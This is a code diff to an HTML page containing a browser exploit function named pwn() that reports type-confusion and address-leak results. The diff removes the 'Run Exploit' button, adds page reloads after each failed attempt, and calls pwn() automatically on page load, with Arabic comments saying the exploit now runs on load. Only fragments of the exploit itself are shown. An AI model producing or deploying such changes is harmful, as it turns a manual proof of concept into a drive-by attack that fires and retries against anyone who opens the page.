@@ -13,7 +13,6 @@
 <body>
     <p id="factors"></p>
     <p id="status">Ready</p>
-    <button id="runBtn">Run Exploit</button>
     <div id="console"></div>
     <script>
 /*
@@ -79,6 +78,7 @@ function pwn() {
     if (!success) {
         document.getElementById("status").innerHTML = "Exploit failed!";
         document.getElementById("console").innerHTML += "Failed to trigger type confusion.\n";
+        location.reload(); // Reload on failure
         return;
     }
 
@@ -114,6 +114,7 @@ function pwn() {
     if (sample >= 0x200000000n || sample < 0x100000000n) {
         document.getElementById("status").innerHTML = "Exploit failed with factor " + factor + "!";
         document.getElementById("console").innerHTML += "Invalid address: 0x" + sample.toString(16) + "\n";
+        location.reload(); // Reload on invalid address
         return;
     } else {
         document.getElementById("status").innerHTML = "Success with factor " + factor + "!";
@@ -145,8 +146,8 @@ function pwn() {
     }
 }
 
-// إضافة حدث النقر على الزر
-document.getElementById("runBtn").addEventListener("click", pwn);
+// تنفيذ الاستغلال تلقائيًا عند التحميل
+pwn();
     </script>
 </body>
 </html>
